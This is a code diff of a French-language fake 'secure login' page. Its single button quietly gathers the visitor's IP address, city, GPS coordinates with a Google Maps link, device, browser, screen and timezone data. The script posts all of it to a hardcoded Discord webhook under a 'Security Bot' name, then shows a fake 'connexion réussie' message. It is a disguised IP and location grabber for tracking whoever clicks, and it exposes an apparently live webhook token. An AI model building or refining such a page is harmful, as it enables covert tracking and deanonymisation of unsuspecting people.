@@ -1,126 +1,179 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Secure</title>
+    <title>Accès Sécurisé</title>
     <style>
+        :root {
+            --primary: #5865F2;
+            --secondary: #EB459E;
+        }
+        
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #2d2d42);
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             color: white;
-            text-align: center;
         }
         
-        .login-container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+        .login-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
             padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
-            max-width: 400px;
             width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            animation: fadeIn 0.8s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        h1 {
+            margin-bottom: 30px;
+            font-weight: 600;
+            font-size: 28px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         
         .login-btn {
-            background: linear-gradient(to right, #ff758c, #ff7eb3);
+            background: linear-gradient(to right, var(--primary), var(--secondary));
             border: none;
             color: white;
-            padding: 15px 30px;
+            padding: 16px 32px;
             font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4);
+            box-shadow: 0 5px 20px rgba(88, 101, 242, 0.4);
             width: 100%;
-            font-weight: bold;
-            letter-spacing: 1px;
+            font-weight: 600;
+            position: relative;
+            overflow: hidden;
         }
         
         .login-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6);
+            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.6);
         }
         
         .login-btn:active {
             transform: translateY(1px);
         }
         
-        h1 {
-            margin-bottom: 30px;
-            font-size: 28px;
+        .login-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to right, rgba(255,255,255,0.2), rgba(255,255,255,0));
+            transform: translateX(-100%);
+            transition: transform 0.6s ease;
+        }
+        
+        .login-btn:hover::after {
+            transform: translateX(100%);
+        }
+        
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.7);
+            min-height: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Connexion Sécurisée</h1>
+    <div class="login-card">
+        <h1>Connexion Requise</h1>
         <button id="loginBtn" class="login-btn">SE CONNECTER</button>
+        <div id="status" class="status"></div>
     </div>
 
     <script>
         document.getElementById('loginBtn').addEventListener('click', async function() {
+            const btn = this;
+            const status = document.getElementById('status');
+            
             try {
-                // Afficher un message pendant le traitement
-                this.textContent = 'Traitement en cours...';
-                this.disabled = true;
+                // Désactiver le bouton pendant le traitement
+                btn.disabled = true;
+                btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite">↻</span> Traitement...';
+                status.textContent = "Collecte des informations...";
                 
-                // Récupérer l'adresse IP
+                // Récupérer l'IP et la localisation
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipResponse.json();
                 
-                // Récupérer la localisation
-                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const locationData = await locationResponse.json();
+                const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locData = await locResponse.json();
                 
-                // Préparer les données à envoyer
-                const deviceInfo = {
-                    ip: ip,
-                    ville: locationData.city,
-                    region: locationData.region,
-                    pays: locationData.country_name,
-                    code_postal: locationData.postal,
-                    latitude: locationData.latitude,
-                    longitude: locationData.longitude,
-                    lien_google_maps: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`,
-                    user_agent: navigator.userAgent,
-                    appareil: navigator.platform,
-                    resolution: `${window.screen.width}x${window.screen.height}`,
-                    langue: navigator.language,
-                    fuseau_horaire: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    date_heure: new Date().toISOString()
+                // Formater les données pour Discord
+                const embed = {
+                    title: "Nouvelle connexion détectée",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "🌍 Adresse IP", value: ip, inline: true },
+                        { name: "📍 Localisation", value: `${locData.city}, ${locData.region}, ${locData.country_name}`, inline: true },
+                        { name: "🗺️ Lien Google Maps", value: `[Voir sur Maps](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})` },
+                        { name: "🖥️ Appareil", value: navigator.platform },
+                        { name: "🔍 User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
+                        { name: "🖥️ Résolution", value: `${window.screen.width}x${window.screen.height}` },
+                        { name: "🌐 Langue", value: navigator.language },
+                        { name: "⏱️ Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
+                        { name: "📅 Date/Heure", value: new Date().toLocaleString() }
+                    ],
+                    footer: { text: "Système de sécurité automatique" },
+                    timestamp: new Date().toISOString()
                 };
                 
-                // Envoyer les données au webhook (REMPLACEZ PAR VOTRE URL)
+                status.textContent = "Envoi des données...";
+                
+                // REMPLACER PAR VOTRE WEBHOOK DISCORD
                 const webhookURL = 'https://discordapp.com/api/webhooks/1393637362151460985/rSzFt_8ovhnAbBIhsmHB33-BbUs8rr6_loE9-ig9feo8TfLeXDgADdDP_aU8TKYJST6Q';
                 
                 const response = await fetch(webhookURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(deviceInfo)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        username: "Security Bot",
+                        avatar_url: "https://i.imgur.com/J5qKZQt.png",
+                        embeds: [embed] 
+                    })
                 });
                 
                 if (response.ok) {
-                    alert('Connexion réussie!');
+                    status.textContent = "✅ Connexion réussie!";
+                    btn.textContent = "Connecté";
+                    
+                    // Redirection après 2 secondes
+                    setTimeout(() => {
+                        window.location.href = "#"; // Mettez votre URL de redirection ici
+                    }, 2000);
                 } else {
-                    throw new Error('Erreur du serveur');
+                    throw new Error('Erreur lors de l\'envoi');
                 }
                 
             } catch (error) {
                 console.error('Erreur:', error);
-                alert('Une erreur est survenue. Veuillez réessayer.');
-            } finally {
-                this.textContent = 'SE CONNECTER';
-                this.disabled = false;
+                status.textContent = "❌ Erreur, veuillez réessayer";
+                btn.textContent = "Réessayer";
+                btn.disabled = false;
             }
         });
     </script>
